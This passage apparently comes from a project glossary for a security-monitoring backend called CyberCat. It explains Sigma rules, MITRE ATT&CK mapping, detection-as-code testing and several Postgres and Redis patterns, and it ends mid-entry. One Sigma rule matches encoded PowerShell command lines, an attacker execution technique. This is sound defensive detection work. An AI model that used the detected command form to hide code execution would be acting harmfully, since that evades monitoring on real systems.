**A real Sigma rule** for "encoded PowerShell — likely T1059.001":

```yaml
title: PowerShell Encoded Command
id: 5b1ad9f4-6c3e-4f87-bf09-3c23e6c79ab1
status: stable
description: Detects use of -EncodedCommand on a PowerShell process
references:
  - https://attack.mitre.org/techniques/T1059/001/
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
    CommandLine|contains:
      - ' -enc '
      - ' -EncodedCommand '
      - ' -ec '
  condition: selection
fields:
  - CommandLine
  - ParentImage
falsepositives:
  - Legitimate admin scripts using -EncodedCommand
level: high
tags:
  - attack.execution
  - attack.t1059.001
```

The `detection` block is the meat. **Modifiers** are pipe-separated suffixes after field names: `Image|endswith:` means "field Image ends with any of these," `CommandLine|contains:` means "substring match." Common modifiers: `contains`, `startswith`, `endswith`, `re` (regex), `cidr` (IP CIDR match), `base64`. Lists in YAML are implicit ORs; a single `selection` matches if *any* item matches.

The `condition` line is a boolean expression: `selection`, `selection1 and selection2`, `1 of selection_*`, `not selection`. Most rules just say `selection` — the simple case.

**The compiler step-by-step** (what CyberCat's backend does at startup):

1. **Parse** — load the YAML, validate against the Sigma schema, build an in-memory rule object.
2. **Field map** — translate Sigma's field names (`Image`, `CommandLine`, `User`) to CyberCat's canonical event field names (`process.path`, `process.command_line`, `entity.user`). The map lives in `backend/app/detection/sigma/field_map.py` and is keyed by the rule's `logsource`.
3. **Compile** — turn the detection clauses into Python predicates. A `selection` block becomes a callable: `lambda event: any(event.process.path.endswith(s) for s in [...]) and any(s in event.process.command_line for s in [...])`.
4. **Register** — add the compiled rule to the detection engine's rule registry, tagged with its ATT&CK techniques.

At ingest time, every `process.created` event runs through every registered Sigma rule's predicate. Matches produce `Detection` rows with the rule's `id`, `level`, and `tags`.

**Why "compile to Python predicates" instead of querying a search engine.** Other Sigma backends emit Splunk SPL or Elasticsearch DSL queries — they delegate the matching to a separate search system. CyberCat doesn't have one; events flow through the backend in real-time, so the predicate runs in-process at ingest. Tradeoff: no historical search, but zero latency between event arrival and detection firing.

**Field-map gotchas.** A rule written for Windows (`Image`, `CommandLine`) and a rule written for Linux (`process.executable`, `process.args`) reference different fields. The `logsource.product` selector tells the backend which field map to apply. Most production Sigma engineers spend more time on field maps than rules.

**Why it exists:** Before Sigma (2017), every detection engineer wrote rules in their SIEM's native query language (SPL for Splunk, KQL for Elastic). Migrating between platforms meant rewriting hundreds of rules. Sigma is the lingua franca: one canonical rule, many backends.

**Where in CyberCat:** `backend/app/detection/sigma/` (parser, compiler, field_map). Curated pack of rules (see `backend/app/detection/sigma/pack/`). Sigma rules and Python rules co-fire on `process.created` events; both produce `Detection` rows that the correlator consumes uniformly.

**Where else you'll see it:** SOC Prime's ThreatBlockr, Splunk's `sigma_searches`, Elastic's detection rules engine, Wazuh's Sigma integration, Panther, Hunters.AI. The rule repo at `github.com/SigmaHQ/sigma` is the community canon.

**Tradeoffs:** Sigma's expressiveness is limited to per-event field matching — it can't easily express "5 events in 60s" or "A then B within 30 minutes." Those need a real engine (CyberCat's Python detectors handle them). Field mapping is the unsexy hard part: every backend needs to translate `Image` → `process.path` for its data shape.

**Related entries:** [Detection-as-Code](#detection-as-code-dac) · [MITRE ATT&CK](#mitre-attck-tactics-techniques-subtechniques)

---

#### MITRE ATT&CK (tactics, techniques, subtechniques)
*Introduced: Phase 9A · Category: Detection*

**Intuition:** MITRE ATT&CK is the industry's shared dictionary of attacker behaviors — a tree of "what attackers actually do" organized by goal (tactics) and method (techniques). Mapping your detections to ATT&CK IDs gives every alert a stable, googleable name.

**Precise:** Maintained by MITRE since 2013. The hierarchy: **tactic** = the "why" (e.g., TA0006 Credential Access), **technique** = the "how" (e.g., T1110 Brute Force), **subtechnique** = the "specifically how" (T1110.003 Password Spraying). Each has a permanent ID, a description, observed real-world groups using it, detections, and mitigations. Free, machine-readable (STIX 2.1), versioned (CyberCat is on v14.1).

**How it works (under the hood):**

**The ID structure**, with examples:

| Level | Format | Example | Meaning |
|---|---|---|---|
| Tactic | `TA####` | `TA0006` | Credential Access (the goal) |
| Technique | `T####` | `T1110` | Brute Force (how to achieve it) |
| Subtechnique | `T####.###` | `T1110.003` | Password Spraying (a specific variant) |

The `.NNN` always reads as "subtechnique of the parent technique." So `T1110.003.startswith("T1110")` is True — that's exactly what CyberCat's recommendation engine relies on for "match by prefix" (a rule for `T1110` boosts every subtechnique match).

**The hand-curated catalog format** (CyberCat's `backend/app/attack/catalog.json`, abbreviated):

```json
{
  "version": "14.1",
  "entries": [
    {
      "id": "T1110",
      "name": "Brute Force",
      "tactic": "TA0006",
      "tactic_name": "Credential Access",
      "url": "https://attack.mitre.org/techniques/T1110/",
      "description": "Adversaries may use brute force techniques to gain access to accounts...",
      "data_sources": ["Authentication logs"],
      "detections": ["Monitor authentication logs for repeated failures..."],
      "mitigations": ["Account Lockout Policies", "MFA"]
    },
    {
      "id": "T1110.003",
      "name": "Password Spraying",
      "tactic": "TA0006",
      "parent": "T1110",
      "url": "https://attack.mitre.org/techniques/T1110/003/",
      "description": "Adversaries may use password spraying to attempt access..."
    }
  ]
}
```

Loaded once at module import:

```python
# backend/app/attack/catalog.py (simplified)
import json, pathlib

_CATALOG: dict[str, dict] = {}

def _load() -> None:
    global _CATALOG
    raw = json.loads(pathlib.Path(__file__).parent.joinpath("catalog.json").read_text())
    _CATALOG = {e["id"]: e for e in raw["entries"]}

_load()

def get_entry(id: str) -> dict | None:
    return _CATALOG.get(id)

def get_catalog() -> list[dict]:
    return list(_CATALOG.values())
```

Module-level dict, O(1) lookup. The 37-entry catalog loads in milliseconds at startup; no per-request cost.

**How techniques flow through the system:**

1. A detection rule (Sigma or Python) declares its ATT&CK IDs in metadata: `tags: [attack.t1110.003, attack.t1078]`.
2. When the rule fires, the resulting `Detection` row carries the IDs.
3. The correlator builds an `Incident` and copies the union of all contributing detections' IDs onto `incident_attack` rows.
4. The frontend's `useAttackEntry(id)` hook looks up the entry from the API (which serves the catalog), renders an `AttackTag` chip with the `name` and a tooltip showing `tactic_name`.
5. The recommendation engine (Phase 15) walks `incident_attack`, applies `technique.startswith(prefix)` matching against its priority-boost map, and ranks candidate actions accordingly.

**The "tactic vs technique vs subtechnique" mnemonic:**

- Tactic = **WHY** the adversary is doing something. Eleven of them; they read like chapter titles in an attacker's playbook (Initial Access, Execution, Persistence, Defense Evasion, ..., Impact).
- Technique = **HOW** they're doing it within that tactic.
- Subtechnique = **SPECIFICALLY HOW**, naming a particular variant.

Same brute-force example: the tactic is `TA0006 Credential Access` (why — to get credentials). The technique is `T1110 Brute Force` (how — by guessing). The subtechnique is `T1110.003 Password Spraying` (specifically — guessing one common password against many usernames, instead of many passwords against one username).

**Why it exists:** Before ATT&CK, every vendor named the same attacker behavior differently — "credential dumping," "password theft," "secret extraction" all meant the same thing. ATT&CK gave the field a shared vocabulary, which also makes it the natural backbone for a coverage scorecard ("what do we detect, what don't we?").

**Where in CyberCat:** `backend/app/attack/catalog.json` (37-entry hand-curated subset covering identity + endpoint + lateral + persistence). `backend/app/attack/catalog.py` (load-once, exports `get_entry(id)`). Every detection rule declares the ATT&CK IDs it implies; correlators copy them onto `incident_attack` rows. UI shows them as `AttackTag` chips. Recommendation engine (Phase 15) uses technique-prefix matching to boost candidate priorities (T1110.003 → matches T1110 → boosts `block_observable`).

**Where else you'll see it:** Every commercial SIEM/EDR (Splunk, Sentinel, CrowdStrike, SentinelOne, Defender, Carbon Black) tags detections with ATT&CK IDs. MITRE Caldera (Phase 21) explicitly drives ATT&CK technique coverage. ATT&CK Navigator is the visual coverage tool everyone uses.

**Tradeoffs:** The full ATT&CK matrix is huge (~200 techniques, 400+ subtechniques) — most projects use a subset. Tactic vs technique vs subtechnique gets confused often (rule of thumb: tactic answers "why," technique answers "how," subtechnique answers "specifically how"). Numbering is stable but descriptions evolve — pin to a version.

**Related entries:** [Sigma rule format](#sigma-rule-format) · [Recommendation engine](#recommendation-engine-two-level-mapping)

---

#### Detection-as-Code (DaC)
*Introduced: Phase 19 · Category: Detection*

**Intuition:** Detection-as-Code means treating detection rules like application code — they live in the repo, get reviewed in PRs, run in CI, have unit tests, and ship through the same pipeline as the rest of the product. The opposite is "click rules into a SIEM UI and pray they still exist after the next upgrade."

**Precise:** DaC is a SOC engineering discipline that emerged ~2019. Its checklist: rules live in version control, every rule has at least one true-positive test fixture and one true-negative, CI runs the test suite on every PR, rule changes get code review, deployments are reproducible (rebuild the engine and you get the same detections). CyberCat shipped this in Phase 19: every detector under `backend/app/detection/rules/` has a corresponding `tests/test_*.py`, the Sigma pack lives in-repo, and CI runs the full pytest matrix on every PR.

**How it works (under the hood):**

**The five practices that make a project DaC-compliant** (in roughly the order you adopt them):

1. **Rules in version control.** All Python detectors and Sigma rules live under `backend/app/detection/`. Nothing is "configured in the UI." Anyone with repo read access can audit the full set; anyone with write access proposes changes via PR.
2. **Per-rule test fixtures.** Every rule has at least one *true-positive* fixture (an event that should fire it) and one *true-negative* (an event that should NOT fire it). Tests assert both directions:

```python
# backend/tests/detection/test_auth_failed_burst.py (simplified)
def test_fires_on_4_failures_in_60s(redis, fake_clock):
    fake_clock.set(1000.0)
    for _ in range(4):
        events_pipeline.handle(make_event("auth.failed", user="alice"))
    detections = list(detections_table.recent(user="alice"))
    assert any(d.rule_id == "py.auth.failed_burst" for d in detections)

def test_does_not_fire_on_3_failures(redis, fake_clock):
    fake_clock.set(1000.0)
    for _ in range(3):
        events_pipeline.handle(make_event("auth.failed", user="bob"))
    detections = list(detections_table.recent(user="bob"))
    assert not any(d.rule_id == "py.auth.failed_burst" for d in detections)
```

The two cases together pin the threshold. Drop the threshold to 3 by mistake → second test fails. Raise it to 5 → first test fails.

3. **CI gate on every PR.** `.github/workflows/ci.yml` runs the backend test suite on every push and PR. Failing tests block merge. Detection rule changes never go in green-screen.
4. **Code review on rule PRs.** Same review process as application code. The reviewer asks: "what's the false-positive rate? Is the test coverage honest? Does this duplicate an existing rule?" These are detection-engineering questions, but the *medium* is a normal PR.
5. **Reproducibility.** Rebuild the Docker image from the same commit → same detection behavior. No mutable state in the engine. Sigma rules ship as data files in the image; Python detectors ship as code; both land via the standard build pipeline.

**The CyberCat directory layout:**

```
backend/
  app/
    detection/
      engine.py                              # @register decorator, run_detectors()
      rules/                                 # Python detectors
        auth_failed_burst.py
        auth_anomalous_source_success.py
        process_suspicious_child.py
        blocked_observable.py
      sigma/                                 # Sigma backend + curated pack
        parser.py
        compiler.py
        field_map.py
        pack/
          process_powershell_encoded.yml
          process_office_spawns_shell.yml
          ...
  tests/
    detection/
      test_auth_failed_burst.py              # tests for the Python detectors
      test_sigma_compiler.py                 # tests for the Sigma backend
      fixtures/
        events_real.json                     # real events used in multiple tests
```

The 1:1 mapping between `rules/foo.py` and `tests/detection/test_foo.py` is intentional — finding the test for a rule is `Ctrl-F test_<filename>`.

**The `@register()` decorator** is the registration mechanism:

```python
# backend/app/detection/engine.py (simplified)
_REGISTRY: list[Callable] = []

def register(rule_id: str, attack: list[str] = []):
    def decorator(fn):
        fn._rule_id = rule_id
        fn._attack = attack
        _REGISTRY.append(fn)
        return fn
    return decorator

async def run_detectors(event, db, redis):
    for detector in _REGISTRY:
        result = await detector(event, db, redis)
        if result:
            db.add(Detection(rule_id=detector._rule_id, attack=detector._attack, event_id=event.id))
```

A rule self-registers by importing its module:

```python
# backend/app/detection/rules/auth_failed_burst.py
from ..engine import register

@register("py.auth.failed_burst", attack=["T1110"])
async def detector(event, db, redis):
    if event.kind != "auth.failed":
        return False
    # ... sliding window check from the Sliding Windows entry ...
    return count >= 4
```

`backend/app/detection/__init__.py` imports every rule module, populating the registry at app startup.

**The CI/CD impact.** With DaC + a passing CI, the deploy pipeline becomes: merge PR → CI runs → image builds → image deploys. A bad rule never reaches production because the test suite caught it. Compare to point-and-click SIEM rules where "I'll just tweak this regex" silently changes prod with no review trail.

**Why it exists:** SIEM-managed rules drift silently — someone disables a noisy rule for "just an hour" and it's still off three months later. DaC makes drift visible (it shows up in `git log`) and reversible (revert the commit). It's the single biggest professionalization step a SOC takes after "we have rules."

**Where in CyberCat:** `backend/app/detection/rules/*.py` (Python detectors), `backend/app/detection/sigma/pack/` (curated Sigma rules), `backend/tests/detection/` (tests). CI workflow: `.github/workflows/ci.yml` runs the backend pytest matrix.

**Where else you'll see it:** Panther, Hunters, Datadog Cloud SIEM, Falco rules, every Splunk shop with a mature detection engineering team. The pattern is borrowed from Infrastructure-as-Code (Terraform, Pulumi).

**Tradeoffs:** Onboarding new detection engineers is slower (they need to learn git, CI, the test framework — not just point-and-click). Iteration cycle is longer than "edit in UI, save." Worth it once you have more than a handful of rules.

**Related entries:** [Sigma rule format](#sigma-rule-format) · [pytest fixtures](#pytest-fixtures) · [Smoke tests](#smoke-tests-vs-unit-tests-vs-integration-tests)

---

### Database (Postgres)

#### ON CONFLICT DO UPDATE / DO NOTHING (upserts and idempotent inserts)
*Introduced: Phase 1 · Category: Database (Postgres)*

**Intuition:** Postgres lets you say "INSERT this row, but if a row with the same key already exists, either update it (`DO UPDATE`) or just skip it silently (`DO NOTHING`)" — all in one atomic SQL statement instead of a fragile read-then-decide-then-write dance.

**Precise:** Postgres 9.5+ supports the `INSERT ... ON CONFLICT (column_list) DO UPDATE SET ... | DO NOTHING` clause (PostgreSQL's spelling of the standard `MERGE` statement / "upsert"). You name the conflict target (a unique index or constraint), and Postgres atomically inserts or applies the conflict action. CyberCat uses **DO UPDATE** for entity normalization (an IP address seen for the second time updates `last_seen_at`) and **DO NOTHING** for junction tables (`incident_events`, `incident_entities` — second link is a noop).

**How it works (under the hood):**

**The lookup mechanics.** When Postgres executes `INSERT ... ON CONFLICT (col) ...`, here's what happens internally for each row:

1. Build the row image to insert.
2. Walk the unique index named in the conflict target. If a row with the same `col` value exists → it's a conflict; jump to step 4.
3. No conflict — perform the normal INSERT. Done.
4. Conflict — apply the conflict action (`DO UPDATE` runs the SET clause; `DO NOTHING` returns nothing).

The whole thing is one atomic operation per row — the lookup, the decision, and the action are all under one row-level lock. Concurrent inserts of the same key get serialized by Postgres; one wins the insert, the rest see the conflict and run the action.

**`DO UPDATE` with `EXCLUDED` — the killer feature.** The pseudo-table `EXCLUDED` holds the values that *would have been* inserted. Use it to express "if it conflicts, update with the new values":

```sql
INSERT INTO entities (id, kind, value, first_seen_at, last_seen_at)
VALUES (gen_random_uuid(), 'ip', '10.0.0.5', now(), now())
ON CONFLICT (kind, value)
DO UPDATE SET
    last_seen_at = EXCLUDED.last_seen_at,
    seen_count = entities.seen_count + 1
RETURNING id;
```

Read this as: "Insert this row; if (kind, value) collides, update the existing row's `last_seen_at` to the new value and bump `seen_count`. Return the row's id either way." That `RETURNING id` is gold — you get the id whether the row was new or existing, without a separate SELECT.

**`DO NOTHING` for idempotent junction inserts.** Adding the same event to the same incident twice should be a no-op, not an error:

```sql
INSERT INTO incident_events (incident_id, event_id)
VALUES ($1, $2)
ON CONFLICT (incident_id, event_id) DO NOTHING;
```

If the link already exists, the conflict triggers `DO NOTHING` → zero rows affected, no error. Your code can blindly insert without first checking.

**The CyberCat usage in SQLAlchemy:**

```python
# backend/app/ingest/entity_extractor.py (simplified)
from sqlalchemy.dialects.postgresql import insert

stmt = (
    insert(Entity)
    .values(kind="ip", value="10.0.0.5", first_seen_at=now, last_seen_at=now)
    .on_conflict_do_update(
        index_elements=["kind", "value"],
        set_={"last_seen_at": now, "seen_count": Entity.seen_count + 1},
    )
    .returning(Entity.id)
)
result = await session.execute(stmt)
entity_id = result.scalar_one()
```

The `index_elements` is the conflict target — must match an existing UNIQUE constraint or unique index. The `set_` dict is the UPDATE clause. `returning` gives you the id back in the same round trip.

**The cost.** `DO UPDATE` triggers a real row update — fires triggers, writes a new row version (Postgres MVCC means UPDATE is internally a delete+insert), generates WAL (write-ahead log) records. So even "no real change" (you set the same value back) does work. For high-volume idempotent paths, prefer `DO NOTHING` over `DO UPDATE WHERE`.

**The conflict target must be a real unique constraint.** Postgres needs a unique index (declared via `UNIQUE` or `CREATE UNIQUE INDEX`) to detect the conflict. "Logically unique by application" doesn't count — without the index, you'd need a serializable transaction and a SELECT-FOR-UPDATE loop. The migration that adds an entity table also adds `UNIQUE (kind, value)` for exactly this reason.

**Why it exists:** Without it, the naive pattern is `SELECT → if not exists → INSERT`, which has a race condition: two concurrent requests both see "not exists," both insert, one of them gets a unique-constraint violation. `ON CONFLICT` collapses both branches into one atomic operation that the DB serializes correctly.

**Where in CyberCat:** `backend/app/ingest/entity_extractor.py` (entity upserts), `backend/app/correlation/extend.py` (`extend_incident()` — junction grows idempotently), most of the correlator-side INSERT statements. The pattern is universal in the ingest pipeline.

**Where else you'll see it:** SQLite (`INSERT OR REPLACE`), MySQL (`INSERT ... ON DUPLICATE KEY UPDATE`), CockroachDB / YugabyteDB (compatible with Postgres syntax). Standard SQL `MERGE` exists but is awkward; `ON CONFLICT` is the ergonomic version.

**Tradeoffs:** `DO UPDATE` triggers an actual row update — fires triggers, updates indexes, generates a WAL (write-ahead log) record — even if nothing changed. For "noop on conflict" performance, `DO NOTHING` is cheaper. Conflict target must be a real unique constraint; "duplicate by application logic" doesn't count.

**Related entries:** [Junction tables](#junction-tables-many-to-many) · [SQLAlchemy (async)](#sqlalchemy-async)

---

#### Junction tables (many-to-many)
*Introduced: Phase 1 · Category: Database (Postgres)*

**Intuition:** A junction table is a tiny extra table whose only job is to record "row A in table X is related to row B in table Y." Two foreign keys, sometimes a couple of metadata columns, that's it. Used whenever the relationship is many-to-many (an incident has many events; an event can belong to many incidents).

**Precise:** A junction (or "join" / "link" / "association") table has a composite primary key on its two foreign keys (usually) plus optional payload columns. `CREATE TABLE incident_events (incident_id UUID REFERENCES incidents(id) ON DELETE CASCADE, event_id UUID REFERENCES events(id) ON DELETE CASCADE, PRIMARY KEY (incident_id, event_id))`. The `ON DELETE CASCADE` propagates deletes through the link. Lookups go via JOIN: `SELECT e.* FROM events e JOIN incident_events ie ON e.id = ie.event_id WHERE ie.incident_id = $1`.

**How it works (under the hood):**

**The DDL** for a junction with a payload column:

```sql
CREATE TABLE incident_entities (
    incident_id UUID NOT NULL REFERENCES incidents(id) ON DELETE CASCADE,
    entity_id   UUID NOT NULL REFERENCES entities(id)  ON DELETE CASCADE,
    role        TEXT NOT NULL,                          -- "victim", "attacker", "tool"
    added_at    TIMESTAMPTZ NOT NULL DEFAULT now(),
    PRIMARY KEY (incident_id, entity_id, role)         -- composite PK with payload
);
CREATE INDEX ix_incident_entities_entity ON incident_entities(entity_id);
```

Two indexes effectively: the primary key index (which Postgres builds automatically) covers `(incident_id, entity_id, role)` and so supports lookups starting with `incident_id`. The explicit secondary index on `entity_id` supports the reverse query — "which incidents involve this entity?"

**Why two indexes.** Btree indexes are only useful when you query on a *prefix* of the index columns. The PK index `(incident_id, entity_id, role)` makes these efficient:

- `WHERE incident_id = $1` ✓ (prefix match)
- `WHERE incident_id = $1 AND entity_id = $2` ✓ (prefix match)
- `WHERE entity_id = $2` ✗ (skips the leading column → seq scan)

The secondary `(entity_id)` index fixes the third query. Junction tables almost always need indexes in both directions because they're queried from both ends.

**The forward query** ("show me everything about this incident"):

```sql
SELECT e.id, e.kind, e.value, ie.role
FROM   incidents i
JOIN   incident_entities ie ON ie.incident_id = i.id
JOIN   entities e          ON e.id = ie.entity_id
WHERE  i.id = $1;
```

The planner walks the PK index from `incident_id = $1`, gets all matching rows, then for each one looks up the entity by id in the `entities` PK index. Two index scans, no sequential scans.

**The reverse query** ("what incidents involve this user?"):

```sql
SELECT i.*, ie.role
FROM   entities e
JOIN   incident_entities ie ON ie.entity_id = e.id
JOIN   incidents i          ON i.id = ie.incident_id
WHERE  e.kind = 'user' AND e.value = 'oziel@example.com';
```

Now the planner walks the secondary `(entity_id)` index. Without it, this query would seq-scan `incident_entities` — fine when small, terrible at scale.

**`ON DELETE CASCADE`** — the cleanup behavior. When you `DELETE FROM incidents WHERE id = $1`, Postgres looks at every FK pointing at `incidents.id` with `ON DELETE CASCADE` and runs the matching DELETEs first. So deleting an incident automatically deletes its junction rows. Without CASCADE you'd get a FK violation error and have to delete the junction rows yourself first.

**Alternatives** worth knowing:

- `ON DELETE RESTRICT` (or no clause — same default) — refuse the delete if any junction row references it. Forces the developer to clean up explicitly.
- `ON DELETE SET NULL` — null out the FK (only works if the column is nullable; rarely useful for junction tables).

**SQLAlchemy ORM mapping** for the same junction:

```python
class Incident(Base):
    __tablename__ = "incidents"
    id: Mapped[UUID] = mapped_column(primary_key=True)
    entities: Mapped[list["IncidentEntity"]] = relationship(back_populates="incident", cascade="all, delete-orphan")

class IncidentEntity(Base):                     # the junction itself, as a class
    __tablename__ = "incident_entities"
    incident_id: Mapped[UUID] = mapped_column(ForeignKey("incidents.id", ondelete="CASCADE"), primary_key=True)
    entity_id: Mapped[UUID] = mapped_column(ForeignKey("entities.id", ondelete="CASCADE"), primary_key=True)
    role: Mapped[str] = mapped_column(primary_key=True)
    incident: Mapped["Incident"] = relationship(back_populates="entities")
    entity: Mapped["Entity"] = relationship()
```

When the junction has a payload column (like `role`), modeling it as its own class is cleaner than `secondary=` (the SQLAlchemy shortcut for pure two-FK junctions). You get the payload in the ORM, not just the linked object.

**Why it exists:** A row can only have one value per column, so you can't store "all the events for this incident" as a column on `incidents`. Junction tables make the relationship its own first-class object — addable, removable, queryable from either side, decoratable with metadata (`incident_entities` adds a `role` column for "victim" / "attacker" / "tool").

**Where in CyberCat:** Six junction tables: `event_entities`, `incident_events`, `incident_entities` (with `role`), `incident_detections`, `incident_attack`, `incident_transitions`. The explainability contract (architecture §7) is mostly "JOIN through these junctions."

**Where else you'll see it:** Universal in relational schemas. Rails calls it `has_many :through`. Django calls it `ManyToManyField` (auto-creates the junction). Any e-commerce schema has `order_items`. Any social schema has `followers`.

**Tradeoffs:** Joins cost — every additional junction in a query adds work for the planner. CyberCat's hot routes (Phase 19 §A7) had query counts in the 200+ range partly because batched per-row entity/detection lookups walked junctions one row at a time. Solution is batched eager loads (`selectinload`).

**Related entries:** [ON CONFLICT](#on-conflict-do-update--do-nothing-upserts-and-idempotent-inserts) · [SQLAlchemy (async)](#sqlalchemy-async)

---

#### citext (case-insensitive text)
*Introduced: Phase 14 · Category: Database (Postgres)*

**Intuition:** `citext` is a Postgres column type that behaves like `text`, except equality and uniqueness comparisons ignore case. Store `"Alice@Example.com"`, search for `"alice@example.com"`, get a hit.

**Precise:** `citext` is a standard Postgres extension (`CREATE EXTENSION citext;`). Internally it stores the text exactly as written but compares using case-folded values. A `UNIQUE` constraint on a `citext` column will reject `"alice@example.com"` if `"ALICE@EXAMPLE.COM"` already exists — matching the natural intuition for emails (which are technically case-sensitive in the local-part per RFC 5321 but universally treated case-insensitively in practice).

**Why it exists:** Without it, you have two lousy options for emails: (1) lowercase everything on insert and read, leaking case-handling logic into every query, or (2) compare with `LOWER(email) = LOWER($1)`, which can't use a normal index. `citext` makes the column itself case-insensitive — index-friendly, intuition-friendly.

**Where in CyberCat:** `users.email` is `CITEXT UNIQUE`. Migration `0006_add_users.py` creates the extension and the column.

**Where else you'll see it:** Postgres-only feature (MySQL has case-insensitive collations as a column property — different mechanism, same goal). Rails / Django apps on Postgres often opt into it for emails. SQLAlchemy has a `CITEXT` type imported from `sqlalchemy.dialects.postgresql`.

**Tradeoffs:** Postgres-specific — if you ever have to port to another DB, citext columns become regular text. Equality check is slightly slower than plain text (case folding has overhead). For ASCII it's basically free; for Unicode the folding rules are locale-dependent.

**Related entries:** [Bcrypt password hashing](#bcrypt-password-hashing) · [RBAC](#rbac-role-based-access-control)

---

#### Connection invalidation on restart
*Introduced: Phase 19 §A3 · Category: Database (Postgres)*

**Intuition:** When Postgres restarts, every connection your code is holding goes stale — like a phone line that gets cut mid-call. The next time your code uses that connection, the database driver raises a "connection invalidated" error. Without a retry, the request fails even though the database is back up.

**Precise:** SQLAlchemy's connection pool tracks connections, but it can't know the server-side state — when Postgres restarts (planned restart, OOM kill, version upgrade), every TCP connection in the pool is broken. The driver detects this on the next operation and raises `DBAPIError` with `connection_invalidated=True`. The pool is supposed to discard invalidated connections via `engine.dispose()` and acquire fresh ones, but the request that *triggered* the discovery still fails — unless you wrap it in a retry decorator that catches the specific error class and re-runs once with a new connection.

**How it works (under the hood):**

**The connection pool layered model:**

```
┌─────────────────────────────────────┐
│  Engine (process-wide)              │
│  ┌───────────────────────────────┐  │
│  │  Pool                          │  │
│  │  ┌────┬────┬────┬────┬────┐    │  │
│  │  │ C1 │ C2 │ C3 │ C4 │ C5 │    │  │ ← N idle ConnectionRecord objects
│  │  └────┴────┴────┴────┴────┘    │  │   each holds a real DBAPI connection
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘
                ↑
           checkout
                │
       ┌────────┴────────┐
       │  Active request │   ← one Connection wrapper, returned to pool on close
       └─────────────────┘
```

A `ConnectionRecord` in the pool holds a real `asyncpg`/`psycopg` connection, plus metadata. On `engine.connect()` (or the equivalent `AsyncSession` checkout), the pool hands out a wrapper around the next idle record. When the request closes the wrapper, the underlying connection goes back to the pool — open, ready for reuse.

**What happens when Postgres restarts.** The TCP connection on every pooled record dies. Neither the pool nor the wrapper notices yet — they're just Python objects. On the next `await connection.execute(stmt)`:

1. The driver writes the query to the (dead) socket. Depending on OS state, this either: succeeds locally (TCP write buffer), or fails immediately with `BrokenPipeError`.
2. The driver waits for the response. Read fails (connection closed by peer) or times out.
3. The driver raises an `OperationalError` (psycopg) or its async equivalent.
4. SQLAlchemy catches it, marks the `ConnectionRecord` as **invalidated**, raises `DBAPIError(connection_invalidated=True)` to the caller.

The pool now knows this record is bad and won't hand it out again — it'll be discarded on the next pool maintenance pass. But the *current request* already failed.

**The retry decorator:**

```python
# backend/app/db/with_ingest_retry.py (simplified)
from functools import wraps
from sqlalchemy.exc import DBAPIError

def with_ingest_retry(fn):
    @wraps(fn)
    async def wrapper(*args, **kwargs):
        try:
            return await fn(*args, **kwargs)
        except DBAPIError as e:
            if not e.connection_invalidated:
                raise                                       # not a connection issue — propagate
            log.warning("connection invalidated; disposing pool and retrying once")
            await engine.dispose()                          # forcibly tear down all connections
            return await fn(*args, **kwargs)                # retry with fresh connections
    return wrapper

@router.post("/events/raw")
@with_ingest_retry
async def ingest_event(...):
    ...
```

`engine.dispose()` walks every record in the pool, closes the underlying connections, and resets the pool to empty. Next checkout opens a fresh connection — to a Postgres that's now back up.

**Why retry once, not infinitely.** Repeated retries can cascade: a Postgres that's *intentionally* down (we're shutting down for maintenance) shouldn't see request floods of retries. One retry covers the "blip during restart" case; persistent failure should bubble up as a 5xx so the caller (or a load balancer) can decide.

**Why retry only invalidated, not all errors.** A `UniqueConstraintViolation` is *not* a connection issue — retrying just hits the same violation. The decorator must check `e.connection_invalidated` and re-raise everything else.

**Why this is safe for ingest specifically.** Ingest is *idempotent* — every event has a dedup key (the SHA-256 of its canonical bytes). If the first attempt actually committed (we'll never know — the failure was post-write but pre-response), the retry's INSERT triggers `ON CONFLICT DO NOTHING` and is harmless. For non-idempotent endpoints (one-shot side effects), retries are dangerous; they need a different pattern (idempotency keys passed by the client, like Stripe's `Idempotency-Key` header).

**The verification path** for the Phase 19 fix:

```bash
# labs/perf/run_postgres_restart_test.sh
python labs/perf/load_harness.py --rate 100 --duration 30 &
HARNESS_PID=$!
sleep 10
docker compose restart postgres
wait $HARNESS_PID
# Expect: ≥95% accepted, transport_errors=0
# Result: 99.2% accepted (2975/2999), transport_errors=0, 24 graceful 5xx during restart window
```

**Why it exists:** Real systems get restarted — for upgrades, for OOM, for chaos testing. A web service that drops every in-flight request when its DB blinks is fragile. The retry pattern is the "five nines" version of "wait, try again."

**Where in CyberCat:** `backend/app/db/with_ingest_retry.py` — a decorator catching `DBAPIError(connection_invalidated=True)`, calling `engine.dispose()`, and re-invoking the wrapped handler exactly once. Wired onto `POST /v1/events/raw` in Phase 19's §A3.1 fix. Verified by `labs/perf/run_postgres_restart_test.sh` (100/s × 30s with `restart postgres` at t=10s; pre-fix: 0/1992 accepted, post-fix: 99.2%).

**Where else you'll see it:** Every production-grade DB driver (psycopg, mysqlclient, JDBC) has a "stale connection" detection. ORMs add it as middleware (Rails' `connection_handler`, Django's `CONN_HEALTH_CHECKS`). PgBouncer adds another layer of pooling that mostly hides this for clients but introduces its own version of the same problem.

**Tradeoffs:** Retrying ingest writes is safe because the events have idempotent dedup keys (the retry can't double-insert). Retrying *reads* is also safe. Retrying *non-idempotent writes* (e.g., "increment a counter") would double-apply on the wrong failure mode — the rule is "retries require idempotency, or you have to read state to know what happened."

**Related entries:** [Async / await in Python](#async--await-in-python) · [SQLAlchemy (async)](#sqlalchemy-async) · [Load harness](#load-harness-rate-duration-transport-errors)

---

### Database (Redis)

#### Pub/Sub
*Introduced: Phase 13 · Category: Database (Redis)*

**Intuition:** Redis Pub/Sub is the simplest possible "many publishers, many subscribers, no persistence" message bus. A publisher calls `PUBLISH channel-name "hello"`; every subscriber currently listening to `channel-name` receives "hello" instantly. Anyone subscribing later sees nothing — there's no replay.

**Precise:** Redis Pub/Sub (`PUBLISH` / `SUBSCRIBE` / `PSUBSCRIBE` for patterns) is fire-and-forget message delivery. Messages are pushed to subscribers' open connections; if a subscriber is offline, the message is gone. There's no queue, no persistence, no acknowledgment. Different from **Redis Streams** (`XADD` / `XREAD` / consumer groups), which is a persistent append-only log with consumer groups and at-least-once delivery.

**How it works (under the hood):**

